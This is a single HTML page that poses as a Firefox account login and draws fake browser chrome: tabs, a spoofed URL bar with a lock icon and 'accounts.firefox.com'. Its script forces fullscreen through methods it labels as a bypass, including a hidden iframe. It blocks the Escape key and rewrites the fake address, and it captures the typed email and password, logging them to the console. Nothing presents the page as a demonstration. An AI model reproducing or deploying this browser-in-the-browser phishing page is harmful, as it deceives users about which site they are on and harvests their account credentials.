<!DOCTYPE html>
<html>
<head>
    <title>Firefox Update</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            background:#1c1b22; 
            color:#fbfbfe; 
            font-family:system-ui; 
            overflow:hidden;
            height:100vh;
        }
        
        /* Firefox UI */
        #firefox-ui {
            position:fixed; top:0; left:0;
            width:100%; height:85px;
            background:#2b2a33;
            border-bottom:1px solid #42414d;
            z-index:9999;
        }
        
        .tabs { 
            height:40px; 
            background:#42414d;
            display:flex; 
            padding:5px 8px 0; 
            gap:2px;
        }
        
        .tab {
            height:35px; min-width:160px;
            background:#52525e;
            border-radius:6px 6px 0 0;
            padding:0 12px;
            display:flex; align-items:center; gap:8px;
            font-size:13px;
            border:1px solid #52525e;
            border-bottom:none;
        }
        
        .tab.active { 
            background:#1c1b22; 
            border-color:#808080;
        }
        
        .nav {
            height:45px;
            display:flex;
            align-items:center;
            padding:0 10px;
            gap:8px;
        }
        
        .url-bar {
            flex:1;
            height:32px;
            background:#42414d;
            border-radius:20px;
            display:flex;
            align-items:center;
            padding:0 15px;
            border:2px solid #0a84ff;
        }
        
        .lock { color:#30e60b; margin-right:8px; }
        
        #url {
            flex:1;
            background:none;
            border:none;
            color:#fbfbfe;
            font-size:14px;
            outline:none;
        }
        
        .content {
            margin-top:85px;
            padding:40px;
            text-align:center;
        }
        
        .btn {
            background:#0060df;
            color:white;
            border:none;
            padding:12px 30px;
            border-radius:6px;
            font-size:16px;
            cursor:pointer;
            margin:20px;
        }
        
        input {
            width:300px;
            padding:12px;
            margin:10px;
            background:#42414d;
            border:1px solid #52525e;
            border-radius:6px;
            color:#fbfbfe;
        }
    </style>
</head>
<body>
    <div id="firefox-ui">
        <div class="tabs">
            <div class="tab active">
                <span style="color:#0a84ff">ðŸ”’</span>
                Secure Portal
            </div>
            <div class="tab">
                <span>ðŸ“§</span>
                Email
            </div>
        </div>
        <div class="nav">
            <button style="color:#fbfbfe;background:none;border:none;font-size:18px;cursor:pointer">â€¹</button>
            <button style="color:#fbfbfe;background:none;border:none;font-size:18px;cursor:pointer">â€º</button>
            <div class="url-bar">
                <span class="lock">ðŸ”’</span>
                <input id="url" value="https://accounts.firefox.com" readonly>
            </div>
        </div>
    </div>
    
    <div class="content">
        <h1 style="color:#0a84ff;margin-bottom:20px;">Firefox Account Login</h1>
        <input type="email" id="email" placeholder="Email">
        <br>
        <input type="password" id="password" placeholder="Password">
        <br>
        <button class="btn" onclick="login()">Sign In</button>
    </div>

    <script>
        // Simple Fullscreen Bypass
        function activateFullscreen() {
            // Method 1: Standard fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
                return true;
            }
            
            // Method 2: Iframe delegation (bypass)
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
            iframe.srcdoc = '<script>document.documentElement.requestFullscreen()<\/script>';
            document.body.appendChild(iframe);
            
            // Method 3: CSS override fallback
            setTimeout(() => {
                document.documentElement.style.cssText = `
                    position:fixed !important;
                    top:0 !important;
                    left:0 !important;
                    width:100vw !important;
                    height:100vh !important;
                    overflow:hidden !important;
                `;
                document.body.style.overflow = 'hidden';
            }, 100);
            
            return true;
        }
        
        // Auto trigger after user interaction
        document.addEventListener('click', function init() {
            activateFullscreen();
            document.removeEventListener('click', init);
        }, {once: true});
        
        // Block escape key
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape') {
                e.preventDefault();
                document.getElementById('url').value = 'https://update.firefox.com/secured';
            }
        });
        
        // Login simulation
        function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Simulate loading
            const btn = document.querySelector('.btn');
            btn.textContent = 'Verifying...';
            btn.disabled = true;
            
            setTimeout(() => {
                console.log('Credentials:', {email, password});
                btn.textContent = 'Redirecting...';
                document.getElementById('url').value = 'https://myaccount.firefox.com/dashboard';
            }, 1500);
        }
        
        // Hide scrollbars
        const style = document.createElement('style');
        style.textContent = '::-webkit-scrollbar{display:none;}';
        document.head.appendChild(style);
    </script>
</body>
</html>
